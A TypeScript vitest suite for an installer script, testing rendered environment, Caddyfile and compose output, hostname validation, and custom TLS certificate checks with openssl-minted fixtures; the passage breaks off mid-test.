// install.sh (WP6 packaging): the installer's --print-* modes render the stack's files as pure
// functions of flags and environment (no root, no side effects), so the contract between the script,
// src/config.ts and the compose stack is testable without a VM (plan 06 "Tests"; contract 00 §15).
// Everything that needs Docker lives in compose.int.test.ts and image.int.test.ts.
import { test, expect } from 'vitest'
import { execFileSync, spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { X509Certificate } from 'node:crypto'
import { CONFIG_KEYS } from '../src/config'

/** The certificate tests mint their fixtures with the `openssl` CLI. Node cannot do it: the
 *  runtime parses X.509 (`crypto.X509Certificate`) and has no API for ISSUING one, so a
 *  self-signed pair with the SANs and the validity windows these cases need would take a new
 *  dependency, and this project takes none. Committed fixtures are not an answer either, since
 *  what is under test is a certificate 30 days out, one 90 days out and one already expired,
 *  and two of those stop being true with time.
 *
 *  So the requirement is declared rather than assumed: `openssl` is needed for these cases,
 *  the README says so, and where it is absent they are SKIPPED by name instead of failing at
 *  the first spawn. CI has it, and so does every box this installs on -- the installer
 *  requires it too. */
const hasOpenssl = spawnSync('sh', ['-c', 'command -v openssl'], { encoding: 'utf8' }).status === 0

const ROOT = join(__dirname, '..')
const SCRIPT = join(ROOT, 'install.sh')
const script = readFileSync(SCRIPT, 'utf8')

// A minimal environment: PATH plus the keys the case sets, so a developer's own INSTA_OSS_* variables
// never leak into an assertion (the script passes every INSTA_OSS_* it sees through to instad.env).
const baseEnv = { PATH: process.env.PATH ?? '/usr/bin:/bin' }
const run = (args: string[], env: Record<string, string> = {}): string =>
  execFileSync('sh', [SCRIPT, ...args], { env: { ...baseEnv, ...env }, encoding: 'utf8' })
const tryRun = (args: string[], env: Record<string, string> = {}) =>
  spawnSync('sh', [SCRIPT, ...args], { env: { ...baseEnv, ...env }, encoding: 'utf8' })

/** KEY=VALUE lines of a rendered instad.env (comments dropped). */
const parseEnv = (out: string): Record<string, string> =>
  Object.fromEntries(out.split('\n')
    .filter((l) => l !== '' && !l.startsWith('#'))
    .map((l) => { const i = l.indexOf('='); return [l.slice(0, i), l.slice(i + 1)] }))

const hasShellcheck = spawnSync('sh', ['-c', 'command -v shellcheck'], { encoding: 'utf8' }).status === 0

test('sh -n install.sh exits 0 (POSIX sh, not bash)', () => {
  const r = spawnSync('sh', ['-n', SCRIPT], { encoding: 'utf8' })
  expect(r.stderr).toBe('')
  expect(r.status).toBe(0)
  expect(script.startsWith('#!/usr/bin/env sh\n')).toBe(true)
  expect(script).toContain('set -eu')
})

test.skipIf(!hasShellcheck)('shellcheck -s sh install.sh is clean (CI runs the same command)', () => {
  const r = spawnSync('shellcheck', ['-s', 'sh', SCRIPT], { encoding: 'utf8' })
  expect(r.stdout + r.stderr).toBe('')
  expect(r.status).toBe(0)
})

test('--print-env writes every key loadConfig reads plus the stack-only keys, with the server defaults', () => {
  const env = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_SECRET: 'deadbeef' }))
  for (const k of CONFIG_KEYS) expect(env, `missing ${k}`).toHaveProperty(k)
  for (const k of ['INSTA_OSS_IMAGE', 'INSTA_OSS_VERSION', 'INSTA_OSS_TLS', 'INSTA_OSS_ACME_EMAIL']) expect(env).toHaveProperty(k)
  expect(env).toMatchObject({
    INSTA_OSS_MODE: 'server',
    INSTA_OSS_DOMAIN: 'example.test',
    INSTA_OSS_SECRET: 'deadbeef',
    INSTA_OSS_DATA_DIR: '/var/lib/instacloud',
    INSTA_OSS_LISTEN_HOST: '127.0.0.1',   // the edge is the only remote client (decision 3)
    INSTA_OSS_PORT: '8080',
    INSTA_OSS_INTERNAL_PORT: '8081',
    INSTA_OSS_TRUST_PROXY: '1',
    INSTA_OSS_AUTH: '1',
    INSTA_OSS_LANE_BIND: '0.0.0.0',
    INSTA_OSS_UI_DIST: '/app/ui/dist',    // where the Dockerfile puts them
    INSTA_OSS_TEMPLATES_DIR: '/app/templates',
    INSTA_OSS_IMAGE: 'ghcr.io/insforge/instacloud',
    INSTA_OSS_TLS: 'acme',
    INSTA_OSS_ACME_EMAIL: '',
    INSTA_OSS_SCHEDULER: '1',
    INSTA_OSS_IDLE_COMPUTE_SEC: '300',
    INSTA_OSS_IDLE_DB_SEC: '600',
    INSTA_OSS_RAM_FLOOR_PCT: '15',
    // On, like the daemon's own default: a fresh install's default-branch compute is always-on.
    // An upgrade keeps whatever its instad.env already says (precedence: env, then the existing
    // file, then this), so a running box's behaviour does not change underneath it.
    INSTA_OSS_ALWAYS_ON_DEFAULT: '1',
  })
  // derived-while-empty keys stay empty so the daemon computes them from DOMAIN and DATA_DIR
  for (const k of ['INSTA_OSS_STATE', 'INSTA_OSS_GARAGE_CONFIG', 'INSTA_OSS_S3_HOST_ENDPOINT', 'INSTA_OSS_API_URL', 'INSTA_OSS_CONSOLE_URL', 'INSTA_OSS_TLS_CERT_DIR']) expect(env[k]).toBe('')
  // no key is written twice (compose's env_file would take the last one silently)
  const keys = run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test' }).split('\n').filter((l) => /^INSTA_OSS_/.test(l)).map((l) => l.split('=')[0])
  expect(new Set(keys).size).toBe(keys.length)
  // print mode never mints a secret when the environment has none: a 64-hex one is generated
  const minted = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test' })).INSTA_OSS_SECRET
  expect(minted).toMatch(/^[0-9a-f]{64}$/)
})

test('--print-env: precedence flag > environment > default; --version strips the v; an image tag is the version', () => {
  const flag = parseEnv(run(['--print-env', '--domain', 'flag.test', '--tls', 'internal', '--version', 'v1.2.3', '--email', 'ops@flag.test'],
    { INSTA_OSS_DOMAIN: 'env.test', INSTA_OSS_TLS: 'acme', INSTA_OSS_SECRET: 'x' }))
  expect(flag).toMatchObject({ INSTA_OSS_DOMAIN: 'flag.test', INSTA_OSS_TLS: 'internal', INSTA_OSS_VERSION: '1.2.3', INSTA_OSS_ACME_EMAIL: 'ops@flag.test' })
  const tagged = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_IMAGE: 'ghcr.io/insforge/instacloud:ci' }))
  expect(tagged).toMatchObject({ INSTA_OSS_IMAGE: 'ghcr.io/insforge/instacloud', INSTA_OSS_VERSION: 'ci' })
  // A tag from INSTA_OSS_IMAGE keeps its leading v: it names a tag that exists, and stripping it
  // made the stack pull an image nobody built.
  const vtag = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_IMAGE: 'instacloud:v0test' }))
  expect(vtag).toMatchObject({ INSTA_OSS_IMAGE: 'instacloud', INSTA_OSS_VERSION: 'v0test' })
  // ...while a v the operator typed is still stripped, from the flag and from the environment
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_VERSION: 'v9.9.9' })).INSTA_OSS_VERSION).toBe('9.9.9')
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'Example.TEST.' })).INSTA_OSS_DOMAIN).toBe('example.test')
})

test('--print-env rejects a bad --tls, a relative --data-dir, a malformed domain and an unknown flag', () => {
  expect(tryRun(['--print-env', '--tls', 'selfsigned'], { INSTA_OSS_DOMAIN: 'x.test' })).toMatchObject({ status: 1, stderr: expect.stringContaining('--tls must be acme, internal or custom') })
  expect(tryRun(['--print-env', '--data-dir', 'relative/dir'], { INSTA_OSS_DOMAIN: 'x.test' })).toMatchObject({ status: 1, stderr: expect.stringContaining('absolute path') })
  expect(tryRun(['--print-env'], { INSTA_OSS_DOMAIN: 'bad_domain!' })).toMatchObject({ status: 1, stderr: expect.stringContaining('is not a hostname') })
  expect(tryRun(['--print-env'], { INSTA_OSS_PUBLIC_IP: 'not-an-ip' })).toMatchObject({ status: 1, stderr: expect.stringContaining('INSTA_OSS_PUBLIC_IP') })
  expect(tryRun(['--nope'])).toMatchObject({ status: 1, stderr: expect.stringContaining('unknown flag --nope') })
  expect(tryRun(['--help']).status).toBe(0)
})

test('a domain that is not a HOSTNAME is refused before anything is written', () => {
  // Measured on a real box: an automation whose IP lookup returned empty passed
  // `--domain .sslip.io`, the old check (`[a-z0-9.-]+`) accepted it, and the installer wrote it
  // into instad.env, compose.yml and the Caddyfile, brought the stack up, spent four minutes
  // failing to get a certificate for `api..sslip.io`, and printed "InstaCloud is running" with
  // console and API URLs that can never resolve. Exit 0.
  const bad: Array<[string, string]> = [
    ['.sslip.io', 'a leading dot: the empty first label is the automation case'],
    ['a..b.test', 'an empty label in the middle'],
    ['-lead.test', 'a label starting with a hyphen'],
    ['trail-.test', 'a label ending with a hyphen'],
    ['singlelabel', 'one label: `api.<domain>` would not be a name'],
    ['.', 'a bare dot, which the trailing-dot strip reduces to nothing'],
    [`${'x'.repeat(64)}.test`, 'a label over 63 characters'],
  ]
  for (const [value, why] of bad) {
    const r = tryRun(['--print-env'], { INSTA_OSS_DOMAIN: value })
    expect(r.status, why).toBe(1)
    expect(r.stderr, why).toMatch(/is not a hostname|resolved to nothing/)
    expect(r.stdout, why).not.toContain('INSTA_OSS_DOMAIN=')
  }
  // ...and the shapes that are hostnames still are, including the derived sslip.io one and a
  // trailing dot, which is stripped rather than refused.
  for (const good of ['example.test', 'a-b.c-d.example.test', '203-0-113-7.sslip.io', 'x1.io']) {
    expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: good })).INSTA_OSS_DOMAIN, good).toBe(good)
  }
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'Example.TEST.' })).INSTA_OSS_DOMAIN).toBe('example.test')
})

test('--tls custom serves a supplied certificate and emits NO on-demand issuance', () => {
  // The parity break this mode exists for: `acme` and `internal` both issue a certificate per
  // HOSTNAME on demand, so deploying a service publishes its exact hostname, and measured on a
  // live box the credential scanners then arrive every 1 to 3 minutes against a 300 s idle
  // timer, so a public compute service never sleeps. The cloud serves one wildcard and publishes
  // nothing. What must therefore be true of this file is negative: no `on_demand` anywhere.
  const args = ['--print-caddyfile', '--tls', 'custom', '--tls-cert', '/etc/instacloud/tls/wild.crt', '--tls-key', '/etc/instacloud/tls/wild.key']
  const caddy = run(args, { INSTA_OSS_DOMAIN: 'example.test' })
  expect(caddy).toContain('tls /etc/instacloud/tls/wild.crt /etc/instacloud/tls/wild.key')
  expect(caddy).not.toContain('on_demand')
  expect(caddy).not.toContain('issuer acme')
  expect(caddy).not.toContain('tls/ask')
  expect(caddy).not.toContain('email')
  // ...and the routing half is unchanged, so this is a certificate change and nothing else.
  expect(caddy).toContain('reverse_proxy 127.0.0.1:8080')
  expect(caddy).toContain('redir https://{host}{uri} permanent')

  // The default modes keep exactly what they had.
  for (const mode of ['acme', 'internal']) {
    const other = run(['--print-caddyfile', '--tls', mode], { INSTA_OSS_DOMAIN: 'example.test' })
    expect(other, mode).toContain('on_demand')
    expect(other, mode).toContain('ask http://127.0.0.1:8081/tls/ask')
  }

  // Both containers get the pair, read-only, at the same path on both sides: the edge serves it
  // and the daemon presents it on the database lanes, which is the other door issuance would
  // otherwise publish a hostname through.
  const compose = run(['--print-compose', '--tls', 'custom', '--tls-cert', '/etc/instacloud/tls/wild.crt', '--tls-key', '/etc/instacloud/tls/wild.key'], { INSTA_OSS_DOMAIN: 'example.test' })
  // The DIRECTORY, not the two files, and this is the renewal story rather than a detail: a file
  // bind mount resolves to an inode at mount time, and every renewal tool replaces a certificate
  // by renaming a new file over the old name, so a container with the FILE mounted keeps reading
  // the old inode until it is recreated. With the directory mounted the name is resolved through
  // the mount on every open. Once per container, and once more when the key lives elsewhere.
  expect(compose.match(/- \/etc\/instacloud\/tls:\/etc\/instacloud\/tls:ro/g)).toHaveLength(2)
  expect(compose).not.toContain('wild.crt:/etc/instacloud/tls/wild.crt')
  const split = run(['--print-compose', '--tls', 'custom', '--tls-cert', '/etc/pki/live/wild.crt', '--tls-key', '/etc/pki/keys/wild.key'], { INSTA_OSS_DOMAIN: 'example.test' })
  expect(split.match(/- \/etc\/pki\/live:\/etc\/pki\/live:ro/g)).toHaveLength(2)
  expect(split.match(/- \/etc\/pki\/keys:\/etc\/pki\/keys:ro/g)).toHaveLength(2)
  // No mounts at all in the other modes.
  expect(run(['--print-compose'], { INSTA_OSS_DOMAIN: 'example.test' })).not.toContain(':ro\n      - /etc')

  // ...and the daemon is told, because it is the daemon that answers the lanes.
  const env = parseEnv(run(['--print-env', '--tls', 'custom', '--tls-cert', '/etc/instacloud/tls/wild.crt', '--tls-key', '/etc/instacloud/tls/wild.key'], { INSTA_OSS_DOMAIN: 'example.test' }))
  expect(env).toMatchObject({
    INSTA_OSS_TLS: 'custom',
    INSTA_OSS_TLS_CERT_FILE: '/etc/instacloud/tls/wild.crt',
    INSTA_OSS_TLS_KEY_FILE: '/etc/instacloud/tls/wild.key',
  })
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test' })).INSTA_OSS_TLS_CERT_FILE).toBe('')
})

test('--tls custom refuses a half-configured pair, and the paths it cannot mount', () => {
  const dom = { INSTA_OSS_DOMAIN: 'example.test' }
  const cases: Array<[string[], string]> = [
    [['--tls', 'custom'], 'needs both --tls-cert'],
    [['--tls', 'custom', '--tls-cert', '/x/c.crt'], 'needs both --tls-cert'],
    [['--tls', 'custom', '--tls-key', '/x/k.key'], 'needs both --tls-cert'],
    [['--tls', 'custom', '--tls-cert', 'rel/c.crt', '--tls-key', '/x/k.key'], 'must be absolute paths'],
    [['--tls', 'custom', '--tls-cert', '/x/c crt', '--tls-key', '/x/k.key'], 'not a plain absolute path'],
    // A pair with nothing to serve it is a silent no-op otherwise: the operator asked for
    // something the resolved mode does not do.
    [['--tls-cert', '/x/c.crt', '--tls-key', '/x/k.key'], 'only apply with --tls custom'],
    [['--tls', 'internal', '--tls-cert', '/x/c.crt', '--tls-key', '/x/k.key'], 'only apply with --tls custom'],
    // ...and from the environment, which is the same request by another route.
    [['--tls', 'internal'], 'only apply with --tls custom'],
    [['--tls', 'nonsense'], '--tls must be acme, internal or custom'],
    // WHERE the pair lives decides whether the stack can start, because each directory becomes a
    // bind mount at the same path inside both containers. Inside the data directory it lands
    // inside the read-write mount the daemon owns; one level up it lands ON TOP of it and hides
    // the data the daemon was started to serve; a system directory replaces the container's own.
    [['--tls', 'custom', '--tls-cert', '/var/lib/instacloud/tls/c.crt', '--tls-key', '/var/lib/instacloud/tls/k.key'], 'is inside the data directory'],
    [['--tls', 'custom', '--tls-cert', '/var/lib/c.crt', '--tls-key', '/var/lib/k.key'], 'contains the data directory'],
    [['--tls', 'custom', '--tls-cert', '/c.crt', '--tls-key', '/k.key'], 'is the filesystem root'],
    [['--tls', 'custom', '--tls-cert', '/etc/c.crt', '--tls-key', '/etc/k.key'], 'is a system directory'],
    // The configuration directory holds instad.env, INSTA_OSS_SECRET included, and every TLS
    // directory is mounted into the edge too: this would hand the daemon's signing secret to a
    // container with no use for it. Its tls/ child, the recommended home, is fine (below).
    [['--tls', 'custom', '--tls-cert', '/etc/instacloud/c.crt', '--tls-key', '/etc/instacloud/k.key'], 'is the configuration directory'],
    [['--tls', 'custom', '--tls-cert', '/etc/instacloud/tls/c.crt', '--tls-key', '/etc/instacloud/k.key'], 'is the configuration directory'],
    // ...and the key alone is enough to fail it: both directories are mounted, so both are checked.
    [['--tls', 'custom', '--tls-cert', '/etc/instacloud/tls/c.crt', '--tls-key', '/var/lib/instacloud/k.key'], 'is inside the data directory'],
  ]
  for (const [args, says] of cases) {
    // The last case is the environment form of the one above it.
    const env = says === 'only apply with --tls custom' && args.length === 2
      ? { ...dom, INSTA_OSS_TLS_CERT_FILE: '/x/c.crt', INSTA_OSS_TLS_KEY_FILE: '/x/k.key' }
      : dom
    const r = tryRun(['--print-env', ...args], env)
    expect(r.status, args.join(' ')).toBe(1)
    expect(r.stderr, args.join(' ')).toContain(says)
  }

  // ...and the directory the docs recommend is not refused, which is the other half of the check.
  expect(tryRun(['--print-compose', '--tls', 'custom', '--tls-cert', '/etc/instacloud/tls/c.crt', '--tls-key', '/etc/instacloud/tls/k.key'], dom).status).toBe(0)

  // ...and the same two directories under another NAME. /etc/instacloud, or the data directory,
  // can itself be a symlink, and a path through its target is the same directory: comparing only
  // how the paths are spelt let a pair beside instad.env into the edge.
  const alias = mkdtempSync(join(tmpdir(), 'io-alias-'))
  try {
    mkdirSync(join(alias, 'cfg-real'))
    symlinkSync(join(alias, 'cfg-real'), join(alias, 'cfg'))
    mkdirSync(join(alias, 'data-real', 'tls'), { recursive: true })
    symlinkSync(join(alias, 'data-real'), join(alias, 'data'))
    const viaCfg = tryRun(['--print-env', '--tls', 'custom',
      '--tls-cert', join(alias, 'cfg-real', 'c.crt'), '--tls-key', join(alias, 'cfg-real', 'k.key'),
    ], { ...dom, IO_CFG_DIR: join(alias, 'cfg') })
    expect(viaCfg.status, viaCfg.stderr).toBe(1)
    expect(viaCfg.stderr).toContain('is the configuration directory')
    const viaData = tryRun(['--print-env', '--tls', 'custom',
      '--tls-cert', join(alias, 'data-real', 'tls', 'c.crt'), '--tls-key', join(alias, 'data-real', 'tls', 'k.key'),
    ], { ...dom, INSTA_OSS_DATA_DIR: join(alias, 'data') })
    expect(viaData.status, viaData.stderr).toBe(1)
    expect(viaData.stderr).toContain('is inside the data directory')
  } finally {
    rmSync(alias, { recursive: true, force: true })
  }

  // A value that only the PREVIOUS install left in instad.env is not a request: it is how a box
  // moves back from custom to acme or internal, and refusing there would strand it in custom
  // mode for good. It is cleared, out loud, and the render is a plain internal one.
  const cfg = mkdtempSync(join(tmpdir(), 'io-cfg-'))
  try {
    writeFileSync(join(cfg, 'instad.env'), [
      'INSTA_OSS_DOMAIN=example.test',
      'INSTA_OSS_TLS=custom',
      'INSTA_OSS_TLS_CERT_FILE=/x/c.crt',
      'INSTA_OSS_TLS_KEY_FILE=/x/k.key',
      '',
    ].join('\n'))
    const back = tryRun(['--print-caddyfile', '--tls', 'internal'], { IO_CFG_DIR: cfg })
    expect(back.status).toBe(0)
    expect(back.stderr).toContain('dropping the supplied certificate')
    expect(back.stdout).toContain('on_demand')
    expect(back.stdout).not.toContain('/x/c.crt')
    // ...and the keys are blanked in instad.env rather than left pointing at a file nothing
    // serves.
    const env2 = parseEnv(run(['--print-env', '--tls', 'internal'], { IO_CFG_DIR: cfg }))
    expect(env2.INSTA_OSS_TLS_CERT_FILE).toBe('')
    expect(env2.INSTA_OSS_TLS_KEY_FILE).toBe('')
  } finally {
    rmSync(cfg, { recursive: true, force: true })
  }
})

test.skipIf(!hasOpenssl)('--tls custom checks the pair can actually serve, before anything starts', () => {
  // Readable and syntactically safe is not the same as able to serve. A mismatched key, a
  // malformed PEM, an expired certificate or a perfectly good certificate for another domain all
  // used to pass, leaving Caddy crash-looping while the install exited 0 saying it was serving
  // your certificate. Third instance of one pattern in this script: success reported over a
  // configuration that cannot work.
  const dir = mkdtempSync(join(tmpdir(), 'io-tls-'))
  const openssl = (args: string, input?: string): void => {
    const r = spawnSync('sh', ['-c', args], { encoding: 'utf8', input })
    if (r.status !== 0) throw new Error(`openssl failed: ${args}\n${r.stderr}`)
  }
  const key = join(dir, 'k.pem')
  const other = join(dir, 'other.pem')
  const wild = join(dir, 'wild.crt')
  const apex = join(dir, 'apex.crt')
  const wrong = join(dir, 'wrong.crt')
  const sampled = join(dir, 'sampled.crt')
  const future = join(dir, 'future.crt')
  const noS3 = join(dir, 'no-s3.crt')
  const shouty = join(dir, 'shouty.crt')
  // Committed rather than minted: OpenSSL only grew `req -not_before/-not_after` in 3.5, and the
  // CI runner's 3.0 cannot mint an expired certificate at all. The fixture is the portable way
  // to exercise the installer's refusal, and it is a self-signed pair for a test domain.
  const expired = join(ROOT, 'test', 'fixtures', 'tls', 'expired.crt')
  const expiredKey = join(ROOT, 'test', 'fixtures', 'tls', 'expired.key')
  const mismatched = join(dir, 'mismatched.crt')
  const junk = join(dir, 'junk.crt')
  try {
    openssl(`openssl req -x509 -newkey rsa:2048 -nodes -sha256 -days 30 -keyout ${key} -out ${wild} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test,DNS:*.s3.example.test,DNS:example.test' 2>/dev/null`)
    openssl(`openssl req -x509 -key ${key} -sha256 -days 30 -out ${apex} -subj '/CN=example.test' -addext 'subjectAltName=DNS:example.test' 2>/dev/null`)
    openssl(`openssl req -x509 -key ${key} -sha256 -days 30 -out ${wrong} -subj '/CN=*.elsewhere.test' -addext 'subjectAltName=DNS:*.elsewhere.test' 2>/dev/null`)
    openssl(`openssl req -x509 -newkey rsa:2048 -nodes -sha256 -days 30 -keyout ${other} -out ${mismatched} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test' 2>/dev/null`)
    // The regression for the check that only SAMPLED names: exactly the three that were sampled
    // and nothing else. It passed, and then the first real service, on a hostname nobody had
    // enumerated, got a certificate that did not cover it.
    openssl(`openssl req -x509 -key ${key} -sha256 -days 30 -out ${sampled} -subj '/CN=api.example.test' -addext 'subjectAltName=DNS:api.example.test,DNS:console.example.test,DNS:web-example-main.example.test' 2>/dev/null`)
    // One wildcard, which looks like the whole answer and is not: `*.example.test` matches ONE
    // label, and buckets are addressed `<bucket>.s3.example.test`, which is two.
    openssl(`openssl req -x509 -key ${key} -sha256 -days 30 -out ${noS3} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test,DNS:example.test' 2>/dev/null`)
    // A certificate whose SANs are capitalised. DNS names are case-insensitive (RFC 4343) and so
    // is TLS name matching, so this covers exactly the same hostnames and every client accepts
    // it; a case-sensitive comparison here refused a certificate that works.
    openssl(`openssl req -x509 -key ${key} -sha256 -days 30 -out ${shouty} -subj '/CN=*.Example.Test' -addext 'subjectAltName=DNS:*.Example.Test,DNS:*.S3.Example.Test,DNS:Example.Test' 2>/dev/null`)
    writeFileSync(junk, 'this is not a certificate\n')

    const bad: Array<[string, string, string]> = [
      [junk, key, 'not a PEM certificate'],
      [wild, junk, 'not a PEM private key'],
      [mismatched, key, 'is not the key for'],
      [expired, expiredKey, 'has already expired'],
      [apex, key, 'does not carry the SAN DNS:*.example.test'],
      [wrong, key, 'does not carry the SAN DNS:*.example.test'],
      // Sampling cannot establish "every hostname this box will ever deploy".
      [sampled, key, 'does not carry the SAN DNS:*.example.test'],
      // ...and neither does one wildcard. `AWS_ENDPOINT_URL_S3=https://s3.<domain>` goes into
      // every deployed app, the SDKs address buckets virtual-hosted by default, and under
      // `custom` nothing is issued for those names, so a certificate without the second
      // wildcard breaks storage for every app on the box while the install reports success.
      [noS3, key, 'does not carry the SAN DNS:*.s3.example.test'],
    ]
    // Right names, right key, right dates, and the wrong PURPOSE: an extended key usage of
    // clientAuth only. It loads and is served, the -k fingerprint probe accepts it, and every
    // client then rejects it as a server certificate, while the install said it was serving.
    const clientOnly = join(dir, 'client-only.crt')
    openssl(`openssl req -x509 -key ${key} -sha256 -days 30 -out ${clientOnly} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test,DNS:*.s3.example.test,DNS:example.test' -addext 'extendedKeyUsage=clientAuth' 2>/dev/null`)
    bad.push([clientOnly, key, 'is not usable as a TLS server certificate'])
    for (const [c, k, says] of bad) {
      // A --print-* run over files that EXIST checks them too, which is how this runs without
      // root: the checks are skipped only when there is nothing to read.
      const r = tryRun(['--print-env', '--tls', 'custom', '--tls-cert', c, '--tls-key', k], { INSTA_OSS_DOMAIN: 'example.test' })
      expect(r.status, says).toBe(1)
      expect(r.stderr, says).toContain(says)
    }
    // A certificate that is not valid YET. `-checkend 0` only proves notAfter is in the future,
    // so this installed cleanly and was then rejected by every client, while the install said it
    // had worked. Skipped where openssl cannot date a certificate forward (`req -not_before`
    // arrived in 3.5), rather than silently not testing it.
    const mintDated = (dates: string, out: string): { status: number | null; out: string } => {
      const r = spawnSync('sh', ['-c',
        `openssl req -x509 -key ${key} -sha256 ${dates} -out ${out} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test,DNS:*.s3.example.test' 2>&1`,
      ], { encoding: 'utf8' })
      return { status: r.status, out: `${r.stdout}${r.stderr}` }
    }
    const dated = mintDated('-not_before 20990101000000Z -not_after 20990201000000Z', future)
    if (dated.status === 0) {
      const r = tryRun(['--print-env', '--tls', 'custom', '--tls-cert', future, '--tls-key', key], { INSTA_OSS_DOMAIN: 'example.test' })
      expect(r.status).toBe(1)
      expect(r.stderr).toContain('is not valid yet')
    } else {
      // The skip has to be able to tell "this openssl has no -not_before" (3.5 added it) from
      // "the command is broken". Sending stderr to /dev/null and then asserting it is defined
      // could not: it passed for a typo, a wrong flag or any other failure, and silently did not
      // test the refusal at all, under a comment claiming the opposite. Matching the WORDING
      // cannot either, which CI showed: OpenSSL 3.0 answers an unknown flag with nothing but
      // "req: Use -help for summary.". So the control is the same command with `-days` in place
      // of the two date flags. If that succeeds, the flags are the only difference and the skip
      // is honest; if it fails too, openssl itself is the problem here and this says so loudly
      // rather than quietly testing nothing.
      const control = mintDated('-days 30', join(dir, 'control.crt'))
      expect(control.status, `openssl req fails for a reason other than -not_before, so the not-yet-valid refusal was NOT exercised. With the dates: ${dated.out} Without them: ${control.out}`).toBe(0)
    }

    // WHY the second wildcard, checked the way a TLS client checks it rather than asserted. A
    // wildcard matches exactly one label, so the certificate that carries only `*.example.test`
    // covers every service hostname and NOT the bucket URLs this box hands to every deployed
    // app. `AWS_ENDPOINT_URL_S3` is injected as `https://s3.<domain>` and the AWS SDKs address
    // buckets virtual-hosted by default; under `custom` there is no on-demand issuance to cover
    // them, by design, so the certificate is the only place this can be fixed.
    const bucketHost = 'my-bucket.s3.example.test'
    // `checkHost` answers with the SAN that matched, so the assertions name the entry.
    expect(new X509Certificate(readFileSync(noS3)).checkHost(bucketHost)).toBeUndefined()
    expect(new X509Certificate(readFileSync(noS3)).checkHost('web-shop-main.example.test')).toBe('*.example.test')
    expect(new X509Certificate(readFileSync(wild)).checkHost(bucketHost)).toBe('*.s3.example.test')

    // The capitalised pair is accepted, for the same reason a browser would accept it.
    const caps = tryRun(['--print-env', '--tls', 'custom', '--tls-cert', shouty, '--tls-key', key], { INSTA_OSS_DOMAIN: 'example.test' })
    expect(caps.status, caps.stderr).toBe(0)

    // ...and the pair that can serve gets past the certificate checks, failing later for the
    // reason a non-root run always fails.
    const ok = tryRun(['--print-env', '--tls', 'custom', '--tls-cert', wild, '--tls-key', key], { INSTA_OSS_DOMAIN: 'example.test' })
    expect(ok.status, ok.stderr).toBe(0)
    expect(parseEnv(ok.stdout).INSTA_OSS_TLS).toBe('custom')
    // ...and a path that does not exist yet still renders, because there is nothing to check.
    expect(tryRun(['--print-env', '--tls', 'custom', '--tls-cert', '/nope/c.crt', '--tls-key', '/nope/k.key'], { INSTA_OSS_DOMAIN: 'example.test' }).status).toBe(0)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test.skipIf(!hasOpenssl)('a symlinked certificate mounts the directory it RESOLVES to as well', () => {
  // certbot's `live/<domain>/fullchain.pem` is a relative link into `../../archive/<domain>/`,
  // which is the commonest real source of these files. Mounting only the link's own directory
  // puts a dangling link inside both containers: valid on the host, unreadable where it is
  // used. Refusing the standard layout would be a poor trade, so the target's directory is
  // mounted too and the configured path keeps pointing at the link.
  const root = mkdtempSync(join(tmpdir(), 'io-le-'))
  try {
    mkdirSync(join(root, 'archive', 'example.test'), { recursive: true })
    mkdirSync(join(root, 'live', 'example.test'), { recursive: true })
    // Real files behind the links: the validation above them is reachable now, and a placeholder
    // would fail as "not a PEM certificate" rather than testing the mount.
    const mint = spawnSync('sh', ['-c',
      `openssl req -x509 -newkey rsa:2048 -nodes -sha256 -days 30 -keyout ${join(root, 'archive', 'example.test', 'privkey1.pem')} -out ${join(root, 'archive', 'example.test', 'fullchain1.pem')} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test,DNS:*.s3.example.test,DNS:example.test' 2>/dev/null`,
    ], { encoding: 'utf8' })
    if (mint.status !== 0) throw new Error(`openssl failed: ${mint.stderr}`)
    symlinkSync('../../archive/example.test/fullchain1.pem', join(root, 'live', 'example.test', 'fullchain.pem'))
    symlinkSync('../../archive/example.test/privkey1.pem', join(root, 'live', 'example.test', 'privkey.pem'))

    const compose = run(['--print-compose', '--tls', 'custom',
      '--tls-cert', join(root, 'live', 'example.test', 'fullchain.pem'),
      '--tls-key', join(root, 'live', 'example.test', 'privkey.pem'),
    ], { INSTA_OSS_DOMAIN: 'example.test' })
    // Both directories, in both containers: the link's, so the configured path exists, and the
    // target's, so it resolves. (A temp dir on macOS is itself a symlink under /var, so the
    // rendered paths are compared by suffix rather than by the string that was passed in.)
    for (const dir of ['/live/example.test:', '/archive/example.test:']) {
      expect(compose.split('\n').filter((l) => l.includes(dir) && l.trim().endsWith(':ro')), dir).toHaveLength(2)
    }
    // ...and the Caddyfile still names the link, not the target, so a renewal that re-points it
    // needs no reinstall.
    const caddy = run(['--print-caddyfile', '--tls', 'custom',
      '--tls-cert', join(root, 'live', 'example.test', 'fullchain.pem'),
      '--tls-key', join(root, 'live', 'example.test', 'privkey.pem'),
    ], { INSTA_OSS_DOMAIN: 'example.test' })
    expect(caddy).toContain('/live/example.test/fullchain.pem')
    expect(caddy).not.toContain('fullchain1.pem')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test.skipIf(!hasOpenssl)('a link the containers cannot follow is refused, and one through a symlinked directory is mounted where it leads', () => {
  // Only the link's directory and its target's are mounted, so inside the containers nothing
  // between them exists. Both layouts below read fine on the host.
  const root = mkdtempSync(join(tmpdir(), 'io-le2-'))
  const mint = (crt: string, key: string): void => {
